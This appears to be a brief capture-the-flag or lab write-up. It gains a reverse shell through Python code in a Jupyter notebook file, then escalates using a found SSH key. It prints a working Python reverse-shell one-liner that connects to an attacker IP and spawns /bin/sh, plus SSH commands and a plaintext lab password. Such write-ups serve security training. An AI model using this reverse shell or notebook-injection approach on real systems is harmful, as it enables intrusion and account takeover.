Using an existing .ipynb file, got a reverse shell via Python by executing a piece of python code present in .ipynb file
```python
import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.103.8",4109));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")
```

Got a reverse shell as `dev-datasci`

Found an SSH private key for user `dev-datasci-priv`. Using the private SSH key,
- Set chmod 600
```bash
chmod 600 devdatasci.key
```
- SSH
```bash
ssh -i devdatasci.key dev-datasci-lowpriv@10.10.83.120
```

Found password for user `dev-datasci-lowpriv:wUqnKWqzha*W!PWrPRWi!M8faUn`
